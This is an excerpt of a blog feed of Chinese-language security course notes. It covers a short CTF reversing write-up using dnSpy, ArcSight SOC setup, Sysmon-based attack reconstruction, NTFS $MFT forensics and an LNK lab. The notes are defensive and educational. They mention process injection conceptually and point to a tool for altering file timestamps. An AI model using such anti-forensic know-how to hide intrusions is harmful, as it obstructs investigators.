實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西
&lt;img src="https://hackmd.io/_uploads/rkR8cPIt2.png" alt="" />&lt;/li>
&lt;li>用dnSpy看source code
在&lt;code>/Nine/Nine.exe/Nine/Stage@02000004/Flag()&lt;/code>以及&lt;code>/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()&lt;/code>都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單
:::spoiler Function Path Screenshot
&lt;img src="https://hackmd.io/_uploads/HkHxLuUYh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyW-8OUK3.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script&lt;/p></description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - ArcSight教學</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/</guid><description>&lt;h1 id="taiwanholyhigh---soc基礎維運---arcsight教學">
 TaiwanHolyHigh - SoC基礎維運 - ArcSight教學
 &lt;a class="anchor" href="#taiwanholyhigh---soc%e5%9f%ba%e7%a4%8e%e7%b6%ad%e9%81%8b---arcsight%e6%95%99%e5%ad%b8">#&lt;/a>
&lt;/h1>
&lt;h2 id="set-up">
 Set Up
 &lt;a class="anchor" href="#set-up">#&lt;/a>
&lt;/h2>
&lt;p>先進到https://bit.ly/44IFecN下載ArcSight Console，並且全部default下一步&lt;/p>
&lt;ol>
&lt;li>(editor需要admin權限)進入localhost host DNS解析 -&amp;gt; C:\Windows\System32\drivers\etc\host
新增 211.75.237.80 chtpoc&lt;/li>
&lt;li>打開ArcSight Console，用之前提供的帳密以及最後打chtpoc，進行登入
&lt;img src="https://hackmd.io/_uploads/B1_MkKc8p.png" alt="圖片" />&lt;/li>
&lt;li>登入之後的狀態
&lt;img src="https://hackmd.io/_uploads/BJNleKc8p.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Hy8IUYqIa.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/Syx6UK986.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S1vRUKcUp.png" alt="圖片" />
ArcSight預設有分大小寫
&lt;img src="https://hackmd.io/_uploads/SJrXPY5UT.png" alt="圖片" />&lt;/p>
&lt;p>活動頻道可以儲存0
&lt;img src="https://hackmd.io/_uploads/SJCEqt9Up.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/HkSr5t5La.png" alt="圖片" />&lt;/p>
&lt;h2 id="規則">
 規則
 &lt;a class="anchor" href="#%e8%a6%8f%e5%89%87">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>WAF規則
&lt;img src="https://hackmd.io/_uploads/B1Ljrc9UT.png" alt="圖片" />&lt;/li>
&lt;li>Firewall規則
&lt;img src="https://hackmd.io/_uploads/rJY6S55IT.png" alt="圖片" />&lt;/li>
&lt;li>IPS
&lt;img src="https://hackmd.io/_uploads/Bykw2m3Ia.png" alt="image" />&lt;/li>
&lt;li>Firewall-BotNet
&lt;img src="https://hackmd.io/_uploads/HkZK2QnIT.png" alt="image" />&lt;/li>
&lt;li>Snort
&lt;img src="https://hackmd.io/_uploads/rJ3onmnUp.png" alt="image" />&lt;/li>
&lt;li>Trojan
&lt;img src="https://hackmd.io/_uploads/BkPhnX2U6.png" alt="image" />&lt;/li>
&lt;li>WineventLog
&lt;img src="https://hackmd.io/_uploads/SkSan7hUT.png" alt="image" />&lt;/li>
&lt;/ul>
&lt;h2 id="清單">
 清單
 &lt;a class="anchor" href="#%e6%b8%85%e5%96%ae">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>抑制清單
&lt;img src="https://hackmd.io/_uploads/rkPcT7hL6.png" alt="image" />&lt;/li>
&lt;li>弱掃清單
&lt;img src="https://hackmd.io/_uploads/HJNlNSnU6.png" alt="image" />&lt;/li>
&lt;/ul>
&lt;h2 id="規則-1">
 規則
 &lt;a class="anchor" href="#%e8%a6%8f%e5%89%87-1">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>即時規則
&lt;img src="https://hackmd.io/_uploads/BJFeaX2La.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中繼站監控
&lt;img src="https://hackmd.io/_uploads/HyqNaX3Lp.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/H1mr672Up.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中繼站監控持續連線
&lt;img src="https://hackmd.io/_uploads/Sk4wpm28T.png" alt="image" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>WAF弱掃
&lt;img src="https://hackmd.io/_uploads/H1kMNHhL6.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/rJ6GEHnUp.png" alt="image" />
&lt;img src="https://hackmd.io/_uploads/HymmES386.png" alt="image" />&lt;/p></description></item><item><title>TaiwanHolyHigh - SoC基礎維運 - HW2</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/</guid><description>&lt;h1 id="taiwanholyhigh---soc基礎維運---hw2">
 TaiwanHolyHigh - SoC基礎維運 - HW2
 &lt;a class="anchor" href="#taiwanholyhigh---soc%e5%9f%ba%e7%a4%8e%e7%b6%ad%e9%81%8b---hw2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/sysinternals/downloads/sysmon">Sysmon Event ID&lt;/a>
&lt;blockquote>
&lt;h3 id="事件識別碼-1處理程序建立">
 事件識別碼 1：處理程序建立
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-1%e8%99%95%e7%90%86%e7%a8%8b%e5%ba%8f%e5%bb%ba%e7%ab%8b">#&lt;/a>
&lt;/h3>
&lt;p>處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 &lt;code>ProcessGUID&lt;/code> 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 &lt;code>HashType&lt;/code> 欄位中的演算法。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-8createremotethread">
 事件識別碼 8：CreateRemoteThread
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-8createremotethread">#&lt;/a>
&lt;/h3>
&lt;p>&lt;code>CreateRemoteThread&lt;/code> 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、&lt;code>StartModule&lt;/code> 和 &lt;code>StartFunction&lt;/code>。 請注意，系統會推斷 &lt;code>StartModule&lt;/code> 和 &lt;code>StartFunction&lt;/code> 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-11filecreate">
 事件識別碼 11：FileCreate
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-11filecreate">#&lt;/a>
&lt;/h3>
&lt;p>建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。&lt;/p>
&lt;hr>
&lt;h3 id="事件識別碼-13registryevent-值已設定">
 事件識別碼 13：RegistryEvent (值已設定)
 &lt;a class="anchor" href="#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-13registryevent-%e5%80%bc%e5%b7%b2%e8%a8%ad%e5%ae%9a">#&lt;/a>
&lt;/h3>
&lt;p>此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 &lt;code>DWORD&lt;/code> 和 &lt;code>QWORD&lt;/code> 的登錄值所寫入的值。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="recon---event-log呈現的攻擊順序">
 Recon - Event Log呈現的攻擊順序
 &lt;a class="anchor" href="#recon---event-log%e5%91%88%e7%8f%be%e7%9a%84%e6%94%bb%e6%93%8a%e9%a0%86%e5%ba%8f">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Event ID: 8 → CreateRemoteThread
首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉
&lt;img src="https://hackmd.io/_uploads/rJjOTA-wa.png" alt="圖片" />
比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的&lt;a href="https://attack.mitre.org/techniques/T1055/001/">reflective dll injection&lt;/a>，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process
&lt;img src="https://hackmd.io/_uploads/Hy9wgyfPp.png" alt="圖片" />&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Background</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-background">
 TaiwanHolyHigh - Windows Forensics - $MFT Background
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-background">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;code>$&lt;/code>在windows代表系統檔案&lt;/li>
&lt;li>&lt;code>$MFT&lt;/code>(Master File Table):&lt;/li>
&lt;li>&lt;a href="https://tw.easeus.com/partition-manager-tips/fat-file-system-format.html">&lt;code>FAT&lt;/code>(File Allocation Table)&lt;/a>:
&lt;blockquote>
&lt;p>Fat 檔案系統，簡稱 File Allocation Table，是微軟和 Caldera 開發組為 Windows 電腦開發的檔案系統
雖然它主要是電腦磁區類型，但在過去幾年中它已作為主要檔案系統格式用於各種手機裝置中。此外，由於它是一個 8 位檔案系統，因此簇數會隨著磁碟容量的增加而增加。
FAT12 - 12 位
FAT16 - 16 位
FAT32 - 32 位
我們還應該澄清，FAT 檔案系統從 1977 年開始使用，但 FAT32 是在 1996 年引入的&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;code>BIOS&lt;/code>(Basic Input Output System)&lt;/li>
&lt;li>&lt;a href="https://bbs.pigoo.com/thread-16131-1-1.html">&lt;code>POST&lt;/code>(Power On Self Test)&lt;/a>
&lt;blockquote>
&lt;p>POST自檢測過程大致為：加電－CPU－ROM－BIOS－System Clock－DMA－64KB RAM－IRQ－顯卡等。檢測顯卡以前的過程稱過關鍵部件測試，如果關鍵部件有問題，計算機會處於掛起狀態，習慣上稱為核心故障。另一類故障稱為非關鍵性故障，檢測完顯卡後，計算機將對64KB以上內存、I／O口、軟硬盤驅動器、鍵盤、即插即用設備、CMOS設置等進行檢測，並在屏幕上顯示各種信息和出錯報告。在正常情況下，POST過程進行得非常快，我們幾乎無法感覺到這個過程。
POST自檢測代碼含義是什麼？
當系統檢測到相應的錯誤時，會以兩種方式進行報告，即在屏幕上顯示出錯信息或以報警聲響次數的方式來指出檢測到的故障。&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-resident--non-resident-file">
 TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-resident--non-resident-file">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>$MFT儲存的內容&lt;/p>
&lt;ol>
&lt;li>==Status==&lt;/li>
&lt;li>==$MFT Record==(File Identify/Location)&lt;/li>
&lt;li>==Timestamp==
&lt;ul>
&lt;li>Standard Info&lt;/li>
&lt;li>Filename&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==Resident==
&lt;ul>
&lt;li>特性如下:
&lt;ul>
&lt;li>$SO\ne 0$: 意思就是resident file的前面一定有其他檔案，而他一定不會是$MFT的開頭&lt;/li>
&lt;li>No File Slack: 沒有檔案暫存區，意味著他會住在一個剛剛好的大小的房間中&lt;/li>
&lt;li>Physical Size = Logical Size: 這個就和前一個有相關，logical size就是實際住進去房間的檔案大小，而physical size就是飯店給予我們房間的大小，所以$physical_size\ge logical_size$&lt;/li>
&lt;li>如果resident file因為駭客的攻擊(injection/trojan/backdoor&amp;hellip;)使得檔案大小變大，而失去原本resident file的身分，則該檔案就會被搬出目前的地方，就算之後檔案大小變回來，還是無法再住回原本的地方，這就是攻擊方所遺留的攻擊痕跡&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>如何判斷?如果檔名後面接的是&lt;code>18 00 00 00 01 00&lt;/code>就是resident file，例如：
:::spoiler 範例
&lt;img src="https://hackmd.io/_uploads/rynQ2dFGp.png" alt="" />
:::
或者是看&lt;code>18 00 00 00 10 00&lt;/code>的前面第二個byte(就是non-resident flag)，是&lt;code>00&lt;/code>代表不是non-resident file，反之就是
:::spoiler flag範例
&lt;img src="https://hackmd.io/_uploads/HkAy6_tMa.png" alt="" />
:::&lt;/li>
&lt;li>檔案大小
&lt;code>18 00 00 00 10 00&lt;/code>後面接著的四個bytes就是檔案大小$\to$換成10禁制就對了，另外如果此檔案是resident file，則檔案大小後面除了固定的&lt;code>18 00 00 00&lt;/code>以外，後面還會有該檔案原本的file signature，以此為例就是&lt;code>89 50 4E 47&lt;/code>也就是png的magical header
:::spoiler flag範例
&lt;img src="https://hackmd.io/_uploads/SkwzAOtGa.png" alt="" />
此範例就是&lt;code>02 02&lt;/code>$\to$514 bytes
:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==non-Resident File==
如果是non-resident file，檔名的後面一點會接的是&lt;code>80 00 00 00 48 00 00 00&lt;/code>，再後面就是non-resident flag
&lt;img src="https://hackmd.io/_uploads/HJk7NFtf6.png" alt="" />
另外，檔案的大小會在flag往後數40個bytes的地方，以底下範例來說就是&lt;code>F6 09 00 00&lt;/code>
&lt;img src="https://hackmd.io/_uploads/BJWMBtKMT.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="lab---resident-file">
 Lab - Resident File
 &lt;a class="anchor" href="#lab---resident-file">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab---offset-43208704d">
 Lab - Offset 43208704(d)
 &lt;a class="anchor" href="#lab---offset-43208704d">#&lt;/a>
&lt;/h3>
&lt;p>先找檔名，後面會跟著&lt;code>18 00 00 00 01 00&lt;/code>，前面會有non-resident flag(前面第二個byte)，再後面會跟著檔案大小&lt;code>D0 01&lt;/code>，再後面一點會跟著原本這個file的signature&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - $MFT 基本實作</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---mft-基本實作">
 TaiwanHolyHigh - Windows Forensics - $MFT 基本實作
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---mft-%e5%9f%ba%e6%9c%ac%e5%af%a6%e4%bd%9c">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::
:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>$MFT儲存的內容
&lt;ol>
&lt;li>==Status==: SO=22, LE=2，也就是目前此檔案的狀態，分為以下四種
&lt;ul>
&lt;li>&lt;code>0000&lt;/code>: Delete File&lt;/li>
&lt;li>&lt;code>0100&lt;/code>: File&lt;/li>
&lt;li>&lt;code>0200&lt;/code>: Delete Folder&lt;/li>
&lt;li>&lt;code>0300&lt;/code>: Folder&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==$MFT Record==(File Identify/Location): SO=44, LE=4，也就是此檔案在record在$MFT的位置在哪邊&lt;/li>
&lt;li>==Timestamp==
&lt;ul>
&lt;li>Standard Info: SO=80, LE=32(Creat+Modified+$MFT Modified+Access)，很容易就可以更改，如果要更改，可以參考&lt;a href="https://newfiletime.en.softonic.com/?ex=RAMP-1462.1">New Filetime&lt;/a>這個工具&lt;/li>
&lt;li>Filename: SO=184, LE=32(Creat+Modified+$MFT Modified+Access)
很難被更改(但還是可以更改)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==Resident / non-Resident File==
下一篇詳細說明&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;p>:::info
以下三個練習都是Resident File
:::&lt;/p>
&lt;h2 id="lab---offset-43110400d">
 Lab - Offset 43110400(d)
 &lt;a class="anchor" href="#lab---offset-43110400d">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>$MFT長度一段就是1024 Bytes，我把結束的位址減掉開頭的位置就知道了，或是可以直接用HxD底下看長度(0x400)
&lt;img src="https://hackmd.io/_uploads/rk0s7QKza.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJjnQ7tfT.png" alt="" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x291D400&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x291D000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1024&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>從上圖也可以看到magical word就是&lt;code>FILE0&lt;/code>$\to$&lt;code>46 49 4C 45 30&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="overview從上到下">
 Overview(從上到下)
 &lt;a class="anchor" href="#overview%e5%be%9e%e4%b8%8a%e5%88%b0%e4%b8%8b">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://hackmd.io/_uploads/S1l-DgEtzp.png" alt="" />&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Background</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---background">
 TaiwanHolyHigh - Windows Forensics - Background
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---background">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="資安事件的流程">
 ==資安事件的流程==
 &lt;a class="anchor" href="#%e8%b3%87%e5%ae%89%e4%ba%8b%e4%bb%b6%e7%9a%84%e6%b5%81%e7%a8%8b">#&lt;/a>
&lt;/h3>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkbVWYmz6.png" alt="" />&lt;/p>
&lt;ul>
&lt;li>Prepare
&lt;ul>
&lt;li>建立Infra&lt;/li>
&lt;li>購買ISO(e.g. &lt;a href="https://www.tsg.com.tw/blog-detail10-248-0-iso27001.htm">ISO 27001&lt;/a>)&lt;/li>
&lt;li>SPA(&lt;a href="https://www.issdu.com.tw/service/9-shc">資安健診&lt;/a>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Predict
&lt;ul>
&lt;li>&lt;a href="https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8376">Threat Intelligence(威脅情資)&lt;/a>&lt;/li>
&lt;li>Recon(情蒐)&lt;/li>
&lt;li>Monitor(監控)&lt;/li>
&lt;li>搜尋Pattern&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Identify(識別): 有興趣可以看這一篇論文筆記&lt;a href="https://hackmd.io/@SBK6401/BJuCGSnAo">DeepCase&lt;/a>
&lt;ul>
&lt;li>&lt;a href="https://www.freedom.net.tw/ict-insight/security/siem-vs-soc.html">SOC(資安監控中心)&lt;/a>
&lt;blockquote>
&lt;p>&lt;img src="https://www.freedom.net.tw/images/article/caption/siem%20vs%20soc.jpg" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>IDS: 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動&lt;/li>
&lt;li>IPS: &lt;a href="https://www.ithome.com.tw/tech/28712">IThelp - Active Defense&lt;/a>&lt;/li>
&lt;li>Audit: AD常常遇到&lt;/li>
&lt;li>EDR&lt;/li>
&lt;li>Code Review&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Prevent: 防禦攻擊
&lt;ul>
&lt;li>Firewall(Layer 4 - Transport)&lt;/li>
&lt;li>&lt;a href="https://www.oracle.com/tw/security/cloud-security/what-is-waf/">WAF(Layer 7 - Application)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.mikotek.com.tw/dlp/">DLP(資料外洩防護)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Incident Profile: 這個項目比較能夠得到一些惡意的行為，而該行為一定脫離不了下面三點
&lt;ol>
&lt;li>Purpose/Payload(有可能是Data, Source, 或金錢等等)&lt;/li>
&lt;li>Path(透過甚麼途徑達成目的，有可能是USB, 社交工程, 0-day)&lt;/li>
&lt;li>Behavior(建立帳戶/開service/與C&amp;amp;C連線等等)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Incident Response
&lt;ul>
&lt;li>Restore(主動)&lt;/li>
&lt;li>Recovery(被動)&lt;/li>
&lt;li>Isolate&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Deter: 主動式的阻絕
&lt;ul>
&lt;li>Inside&lt;/li>
&lt;li>Outside(就是找外援通常是執法單位)
&lt;ul>
&lt;li>law enforcement(執法單位)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Forensics Triage: 做分流的動作
&lt;ul>
&lt;li>揮發性資料(RAM&amp;hellip;)&lt;/li>
&lt;li>Network&lt;/li>
&lt;li>Process&lt;/li>
&lt;li>System&lt;/li>
&lt;li>Artifacts(registry/log/temp&amp;hellip;)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Duplicate(Image): 製作證據的映像檔$\to$非揮發性的資料
&lt;ul>
&lt;li>RAW Image&lt;/li>
&lt;li>Evidence File&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Forensics Analysis
&lt;ul>
&lt;li>已知項目(Known)
&lt;ul>
&lt;li>Keyword&lt;/li>
&lt;li>Hash&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Baseline
&lt;ul>
&lt;li>Recovery&lt;/li>
&lt;li>Signature&lt;/li>
&lt;li>Sorting&lt;/li>
&lt;li>Artifact
&lt;ul>
&lt;li>LNK&lt;/li>
&lt;li>Prefetch&lt;/li>
&lt;li>SPL&lt;/li>
&lt;li>Thumbnail&lt;/li>
&lt;li>Registry(非揮發性)&lt;/li>
&lt;li>Log&lt;/li>
&lt;li>Recycle Bin&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="網路攻擊鍊cyber-kill-chain">
 ==網路攻擊鍊(Cyber Kill Chain)==
 &lt;a class="anchor" href="#%e7%b6%b2%e8%b7%af%e6%94%bb%e6%93%8a%e9%8d%8acyber-kill-chain">#&lt;/a>
&lt;/h3>
&lt;p>詳細資料: &lt;a href="https://teamt5.org/tw/posts/what-is-cyber-kill-chain/">TeamT5 - Cyber Kill Chain&lt;/a>&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - LNK Lab</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---lnk-lab">
 TaiwanHolyHigh - Windows Forensics - LNK Lab
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---lnk-lab">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>What is .LNK?
&lt;blockquote>
&lt;p>LNK 檔為 Windows 系統中，執行程式或開啟檔案後會留存的捷徑檔，該檔案內會有相當多的資訊&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>Where is .LNK?
&lt;blockquote>
&lt;p>預設 LNK 檔案會放在使用者目錄下，可透過以下指令檢視：&lt;code>$ dir c:\Users\{username}\*.lnk /b /s&lt;/code>
:::spoiler 執行結果&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dir c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\*&lt;/span>.lnk /b /s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup1&lt;span style="color:#ae81ff">\1&lt;/span> - Desktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\W&lt;/span>inX&lt;span style="color:#ae81ff">\G&lt;/span>roup2&lt;span style="color:#ae81ff">\1&lt;/span> - Run.lnk
